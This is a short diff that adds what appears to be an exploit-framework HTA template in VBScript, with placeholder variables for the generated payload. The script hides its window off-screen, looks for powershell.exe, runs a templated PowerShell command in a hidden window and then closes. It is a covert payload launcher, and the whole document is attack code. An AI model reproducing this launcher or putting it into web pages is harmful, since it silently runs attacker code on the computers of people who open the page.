@@ -1,0 +1,12 @@
+<script language="VBScript">
+  window.moveTo -4000, -4000
+  Set %{var_shell} = CreateObject("Wscript.Shell")
+  Set %{var_fso} = CreateObject("Scripting.FileSystemObject")
+  For each path in Split(%{var_shell}.ExpandEnvironmentStrings("%%PSModulePath%%"),";")
+    If %{var_fso}.FileExists(path + "\..\powershell.exe") Then
+      %{var_shell}.Run "%{powershell}",0
+      Exit For
+    End If
+  Next
+  window.close()
+</script>
